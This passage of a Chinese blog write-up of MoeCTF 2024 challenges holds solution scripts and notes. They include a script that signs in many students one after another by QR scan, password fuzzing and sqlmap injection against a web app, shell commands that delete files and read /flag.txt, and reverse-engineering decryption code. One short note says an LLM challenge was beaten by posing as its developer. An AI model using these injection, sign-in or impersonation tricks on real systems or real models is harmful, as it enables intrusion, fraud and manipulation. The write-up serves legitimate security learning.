class="hljs-built_in">enumerate</span>(student_phones, start=<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Processing student <span class="hljs-subst">&#123;phone&#125;</span> (#<span class="hljs-subst">&#123;index&#125;</span>)...&quot;</span>)<br>        <span class="hljs-keyword">if</span> student_login(phone):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Student <span class="hljs-subst">&#123;phone&#125;</span> logged in successfully.&quot;</span>)<br>            result = scan_QR()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Scan result for student <span class="hljs-subst">&#123;phone&#125;</span>: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;签到成功&quot;</span> <span class="hljs-keyword">in</span> result:<br>                successful_sign_ins += <span class="hljs-number">1</span><br>            <span class="hljs-comment"># Clear session cookies to prevent carry-over issues</span><br>            session.cookies.clear()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Student <span class="hljs-subst">&#123;phone&#125;</span> login failed.&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;All students processed. Total successful sign-ins: <span class="hljs-subst">&#123;successful_sign_ins&#125;</span>.&quot;</span>)<br>    <span class="hljs-keyword">if</span> successful_sign_ins == <span class="hljs-built_in">len</span>(student_phones):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;All students have signed in successfully.&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(student_phones) - successful_sign_ins&#125;</span> students failed to sign in.&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><h2 id="smbms-复现"><a href="#smbms-复现" class="headerlink" title="smbms(复现)"></a>smbms(复现)</h2><p>这题没看，做起来其实主要就是sql这边的注入慢慢的调试吧默认是admin然后bp来fuzz一下密码，得到1234567</p><p>然后就是慢慢调试sqlmap了，最后的命令如图</p><p><img src="/../../images/moectf/moectf2024/sms.png" alt="sms"></p><h1 id="开发与运维基础"><a href="#开发与运维基础" class="headerlink" title="开发与运维基础"></a>开发与运维基础</h1><h2 id="运维入门指北"><a href="#运维入门指北" class="headerlink" title="运维入门指北"></a>运维入门指北</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">find . -name <span class="hljs-string">&quot;*.bak&quot;</span> -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">rm</span> -f &#123;&#125; +<br>find . -name <span class="hljs-string">&quot;*.xml&quot;</span> -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> sh -c <span class="hljs-string">&#x27;for file; do mv -- &quot;$file&quot; &quot;$&#123;file%.xml&#125;.html&quot;; done&#x27;</span> _ &#123;&#125; +<br>find . -<span class="hljs-built_in">type</span> f | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> -r file; <span class="hljs-keyword">do</span> filename=$(<span class="hljs-built_in">basename</span> <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span>); dir1=<span class="hljs-variable">$&#123;filename:0:2&#125;</span>; dir2=<span class="hljs-variable">$&#123;filename:2:2&#125;</span>; <span class="hljs-built_in">mkdir</span> -p <span class="hljs-string">&quot;<span class="hljs-variable">$dir1</span>/<span class="hljs-variable">$dir2</span>&quot;</span>; <span class="hljs-built_in">mv</span> <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$dir1</span>/<span class="hljs-variable">$dir2</span>/<span class="hljs-variable">$filename</span>&quot;</span>; <span class="hljs-keyword">done</span><br>su toor<br><span class="hljs-built_in">mv</span> * /var/www/html/<br>grep <span class="hljs-string">&#x27;flag&#x27;</span> /var/log/nginx/access.log<br></code></pre></td></tr></table></figure><h2 id="哦不！我的libc！"><a href="#哦不！我的libc！" class="headerlink" title="哦不！我的libc！"></a>哦不！我的libc！</h2><p>用xshell进行连接，简单测试一下常规的语句都不能用了</p><p>使用Shell 内建命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">while</span> IFS= <span class="hljs-built_in">read</span> -r line; <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$line</span>&quot;</span>; <span class="hljs-keyword">done</span> &lt; /flag.txt<br></code></pre></td></tr></table></figure><p>得到flag</p><h1 id="大语言模型应用安全"><a href="#大语言模型应用安全" class="headerlink" title="大语言模型应用安全"></a>大语言模型应用安全</h1><h2 id="Neuro"><a href="#Neuro" class="headerlink" title="Neuro?"></a>Neuro?</h2><p>先我是vedal回答，然后告诉他亲自好像（二次认证好像,不太记得了</p><h2 id="并非助手"><a href="#并非助手" class="headerlink" title="并非助手"></a>并非助手</h2><p>尝试了一会正常的是不能输入的，表情包可以，联想到flag就是旗子，输入🚩得到flag</p><h1 id="逆向工程"><a href="#逆向工程" class="headerlink" title="逆向工程"></a>逆向工程</h1><h2 id="逆向工程入门指北"><a href="#逆向工程入门指北" class="headerlink" title="逆向工程入门指北"></a>逆向工程入门指北</h2><p>代码放在c环境里面运行就行</p><h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><p>进行简单的异或就行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">ls=[<span class="hljs-number">0x49</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x46</span>,<span class="hljs-number">0x10</span>, <span class="hljs-number">0x13</span>,<br><span class="hljs-number">0x1C</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0x10</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x42</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x15</span>,<br><span class="hljs-number">0x14</span>,<span class="hljs-number">0x14</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x14</span>,<span class="hljs-number">0x41</span>, <span class="hljs-number">0x40</span>,<span class="hljs-number">0x40</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x40</span>,<br><span class="hljs-number">0x14</span>, <span class="hljs-number">0x59</span>]<br>s=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-string">for i in ls:</span><br><span class="hljs-string">s+=chr(i^0x24)</span><br><span class="hljs-string">print(s)</span><br></code></pre></td></tr></table></figure><h2 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">decrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> &amp;v4, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> &amp;v5)</span> </span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> delta = <span class="hljs-number">0x9E3779B9</span>;  <span class="hljs-comment">// 固定值 1640531527</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3 = delta * <span class="hljs-number">32</span>;     <span class="hljs-comment">// 反向过程从最大值开始</span><br>    <span class="hljs-type">int</span> v6 = <span class="hljs-number">32</span>;<br><br>    <span class="hljs-keyword">while</span> (v6 &gt; <span class="hljs-number">0</span>) &#123;<br>        v5 -= ((v4 + v3) ^ ((v4 &lt;&lt; <span class="hljs-number">4</span>) + <span class="hljs-number">1634038898</span>)) ^ ((v4 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">1634038904</span>);<br>        v4 -= ((v5 + v3) ^ ((v5 &lt;&lt; <span class="hljs-number">4</span>) + <span class="hljs-number">1702060386</span>)) ^ ((v5 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">1870148662</span>);<br>        v3 -= delta;  <span class="hljs-comment">// 解密时减少 delta</span><br>        v6--;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4 = <span class="hljs-number">676078132</span>;  <span class="hljs-comment">// xxxxxxxx 部分解密后的值</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5 = <span class="hljs-number">957400408</span>;  <span class="hljs-comment">// zzzz 和 yyyy 部分解密后的值</span><br><br>    <span class="hljs-comment">// 调用解密函数</span><br>    <span class="hljs-built_in">decrypt</span>(v4, v5);<br><br>    <span class="hljs-comment">// 提取出 yyyy 和 zzzz 部分</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v11 = (v5 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFFFF</span>;  <span class="hljs-comment">// yyyy 部分</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v9 = v5 &amp; <span class="hljs-number">0xFFFF</span>;           <span class="hljs-comment">// zzzz 部分</span><br><br>    <span class="hljs-comment">// 输出结果</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;xxxxxxxx = &quot;</span> &lt;&lt; std::hex &lt;&lt; v4 &lt;&lt; std::endl;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;yyyy = &quot;</span> &lt;&lt; std::hex &lt;&lt; v11 &lt;&lt; std::endl;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;zzzz = &quot;</span> &lt;&lt; std::hex &lt;&lt; v9 &lt;&lt; std::endl;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;moectf&#123;&quot;</span> &lt;&lt; std::hex &lt;&lt; v4 &lt;&lt; <span class="hljs-string">&quot;-&quot;</span> &lt;&lt; v11 &lt;&lt; <span class="hljs-string">&quot;-&quot;</span> &lt;&lt; v9 &lt;&lt; <span class="hljs-string">&quot;-9c42-caf30620caaf&#125;&quot;</span> &lt;&lt; std::endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="upx"><a href="#upx" class="headerlink" title="upx"></a>upx</h2><p>先使用upx工具先脱壳，再进行ida的正常阅读</p><p>里面直接由flag</p><p><strong>moectf{ec5390dd-f8cf-4b02-bc29-3bb0c5604c29}</strong></p><h2 id="upx-revenge"><a href="#upx-revenge" class="headerlink" title="upx-revenge"></a>upx-revenge</h2><p>ESP x64dbg手动脱壳一下用ida64打开得到flag</p><p><img src="/../../images/moectf/moectf2024/upx-renvenge.png" alt="upx-renvenge"></p><h2 id="dynamic"><a href="#dynamic" class="headerlink" title="dynamic"></a>dynamic</h2><p>下载打开文件，按shift+f12找到对应的页面，找到what happened to my flag?</p><p>里面有一段逻辑进行REencrypto之后就变了，给what那行打断点，f9动调得到flag</p><p><img src="/../../images/moectf/moectf2024/dynamic.png" alt="dynamic"></p><h2 id="d0tN3t"><a href="#d0tN3t" class="headerlink" title="d0tN3t"></a>d0tN3t</h2><p>用dnSpy打开定位到关键代码，然后写解密脚本</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    std::vector&lt;<span class="hljs-type">uint8_t</span>&gt; array = &#123;<br>        <span class="hljs-number">173</span>, <span class="hljs-number">146</span>, <span class="hljs-number">161</span>, <span class="hljs-number">174</span>, <span class="hljs-number">132</span>, <span class="hljs-number">179</span>, <span class="hljs-number">187</span>, <span class="hljs-number">234</span>, <span class="hljs-number">231</span>, <span class="hljs-number">244</span>,<br>        <span class="hljs-number">177</span>, <span class="hljs-number">161</span>, <span class="hljs-number">65</span>, <span class="hljs-number">13</span>, <span class="hljs-number">18</span>, <span class="hljs-number">12</span>, <span class="hljs-number">166</span>, <span class="hljs-number">247</span>, <span class="hljs-number">229</span>, <span class="hljs-number">207</span>,<br>        <span class="hljs-number">125</span>, <span class="hljs-number">109</span>, <span class="hljs-number">67</span>, <span class="hljs-number">180</span>, <span class="hljs-number">230</span>, <span class="hljs-number">156</span>, <span class="hljs-number">125</span>, <span class="hljs-number">127</span>, <span class="hljs-number">182</span>, <span class="hljs-number">236</span>,<br>        <span class="hljs-number">105</span>, <span class="hljs-number">21</span>, <span class="hljs-number">215</span>, <span class="hljs-number">148</span>, <span class="hljs-number">92</span>, <span class="hljs-number">18</span>, <span class="hljs-number">199</span>, <span class="hljs-number">137</span>, <span class="hljs-number">124</span>, <span class="hljs-number">38</span>,<br>        <span class="hljs-number">228</span>, <span class="hljs-number">55</span>, <span class="hljs-number">62</span>, <span class="hljs-number">164</span><br>    &#125;;<br><br>    std::string flag;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; array.<span class="hljs-built_in">size</span>(); ++i) &#123;<br>        <span class="hljs-type">char</span> decrypted_char = <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">char</span>&gt;((array[i] ^ (i * i)) ^ <span class="hljs-number">114</span>) - <span class="hljs-number">114</span>;<br>        flag += decrypted_char;<br>    &#125;<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Decrypted Flag: &quot;</span> &lt;&lt; flag &lt;&lt; std::endl;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="逆向工程进阶指北"><a href="#逆向工程进阶指北" class="headerlink" title="逆向工程进阶指北"></a>逆向工程进阶指北</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>* arr)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">33</span>; j &lt;= <span class="hljs-number">126</span>; j++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">33</span>; k &lt;= <span class="hljs-number">126</span>; k++)<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> l = <span class="hljs-number">33</span>; l &lt;= <span class="hljs-number">126</span>; l++)<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">33</span>; m &lt;= <span class="hljs-number">126</span>; m++) &#123;<br>                    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> temp[] = &#123; (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)j, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)k, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)l, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)m &#125;;<br>                    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>* p = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>*)temp;<br>                    <span class="hljs-keyword">if</span> (((*p * <span class="hljs-number">0xccffbbbb</span> + <span class="hljs-number">0xdeadc0de</span>) ^ <span class="hljs-number">0xdeadbeef</span> + <span class="hljs-number">0xd3906</span>) == arr[i]) &#123;<br>                        cout &lt;&lt; (<span class="hljs-type">char</span>)j &lt;&lt; (<span class="hljs-type">char</span>)k &lt;&lt; (<span class="hljs-type">char</span>)l &lt;&lt; (<span class="hljs-type">char</span>)m;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>                    &#125;<br>                &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  <span class="hljs-comment">// 返回-1表示没有找到匹配的字符组合</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> arr[] = &#123;<br>        <span class="hljs-number">0xb5073388</span>, <span class="hljs-number">0xf58ea46f</span>, <span class="hljs-number">0x8cd2d760</span>, <span class="hljs-number">0x7fc56cda</span>,<br>        <span class="hljs-number">0x52bc07da</span>, <span class="hljs-number">0x29054b48</span>, <span class="hljs-number">0x42d74750</span>, <span class="hljs-number">0x11297e95</span>,<br>        <span class="hljs-number">0x5cf2821b</span>, <span class="hljs-number">0x747970da</span>, <span class="hljs-number">0x64793c81</span><br>    &#125;;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">11</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">find</span>(i, arr) == <span class="hljs-number">-1</span>) &#123;<br>            cout &lt;&lt; <span class="hljs-string">&quot;No match found for arr[&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;]\n&quot;</span>;<br>        &#125;<br>    &#125;<br>    cout &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="SecretModule"><a href="#SecretModule" class="headerlink" title="SecretModule"></a>SecretModule</h2><p>下载得到文件，打开看customize.sh，提示base64，解密后下载文件，得到以下内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-function"><span class="hljs-title">testk</span></span>() &#123;<br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Welcome to the Secret module!But before you begin,you need to prove your self.&quot;</span><br>  (/system/bin/getevent -lc 1 2&gt;&amp;1 | /system/bin/grep VOLUME | /system/bin/grep <span class="hljs-string">&quot; DOWN&quot;</span> &gt; <span class="hljs-variable">$MODPATH</span>/events) || <span class="hljs-built_in">return</span> 1<br>  <span class="hljs-built_in">return</span> 0<br>&#125;   <br><br><span class="hljs-function"><span class="hljs-title">choose</span></span>() &#123;<br>  <span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span><br>    /system/bin/getevent -lc 1 2&gt;&amp;1 | /system/bin/grep VOLUME | /system/bin/grep <span class="hljs-string">&quot; DOWN&quot;</span> &gt; <span class="hljs-variable">$MODPATH</span>/events<br>    <span class="hljs-keyword">if</span> (`<span class="hljs-built_in">cat</span> <span class="hljs-variable">$MODPATH</span>/events 2&gt;/dev/null | /system/bin/grep VOLUME &gt;/dev/null`); <span class="hljs-keyword">then</span><br>      <span class="hljs-built_in">break</span><br>    <span class="hljs-keyword">fi</span><br>  <span class="hljs-keyword">done</span><br>  <span class="hljs-keyword">if</span> (`<span class="hljs-built_in">cat</span> <span class="hljs-variable">$MODPATH</span>/events 2&gt;/dev/null | /system/bin/grep VOLUMEUP &gt;/dev/null`); <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;114514&quot;</span><br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;1919810&quot;</span><br>  <span class="hljs-keyword">fi</span><br>&#125;<br><br><span class="hljs-keyword">if</span> testk; <span class="hljs-keyword">then</span><br>  ui_print <span class="hljs-string">&quot;Great! Now enter the secret.&quot;</span><br><br><span class="hljs-keyword">else</span><br>  ui_print <span class="hljs-string">&quot;Legacy Device. Use a newer device to do this challenge&quot;</span><br>  <span class="hljs-built_in">exit</span><br><span class="hljs-keyword">fi</span><br><br>concatenated=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> 1 2 3 4 5 6 7<br><span class="hljs-keyword">do</span><br>  result=$(choose)<br>  concatenated=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;concatenated&#125;</span><span class="hljs-variable">$&#123;result&#125;</span>&quot;</span><br><span class="hljs-keyword">done</span><br><br>input_str=$(<span class="hljs-built_in">echo</span> -n <span class="hljs-variable">$concatenated</span> | <span class="hljs-built_in">md5sum</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>)<br>sec=<span class="hljs-string">&quot;77a58d62b2c0870132bfe8e8ea3ad7f1&quot;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> <span class="hljs-variable">$input_str</span> = <span class="hljs-variable">$sec</span><br><span class="hljs-keyword">then</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;You are right!Flag is&#x27;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;moectf&#123;<span class="hljs-variable">$concatenated</span>&#125;&quot;</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Wrong. Try again.&#x27;</span><br><span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure><p>gpt帮帮我，写出解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> itertools<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5_hash</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(s.encode()).hexdigest()<br><br><span class="hljs-comment"># 目标哈希值</span><br>target_hash = <span class="hljs-string">&quot;77a58d62b2c0870132bfe8e8ea3ad7f1&quot;</span><br><br><span class="hljs-comment"># 定义两个可能的结果</span><br>options = [<span class="hljs-string">&quot;114514&quot;</span>, <span class="hljs-string">&quot;1919810&quot;</span>]<br><span class="hljs-comment"># 枚举所有可能的组合，7个位置，每个位置有两个可能的选择</span><br><span class="hljs-keyword">for</span> combo <span class="hljs-keyword">in</span> itertools.product(options, repeat=<span class="hljs-number">7</span>):<br>    <span class="hljs-comment"># 组合成一个字符串</span><br>    concatenated = <span class="hljs-string">&quot;&quot;</span>.join(combo)<br>    <span class="hljs-comment"># 计算其 MD5 哈希值</span><br>    hashed = md5_hash(concatenated)<br><br>    <span class="hljs-comment"># 如果哈希值匹配目标</span><br>    <span class="hljs-keyword">if</span> hashed == target_hash:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;找到匹配的输入序列: <span class="hljs-subst">&#123;combo&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;输入字符串: <span class="hljs-subst">&#123;concatenated&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Flag 是: moectf&#123;&#123;<span class="hljs-subst">&#123;concatenated&#125;</span>&#125;&#125;&quot;</span>)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="rc4"><a href="#rc4" class="headerlink" title="rc4"></a>rc4</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span 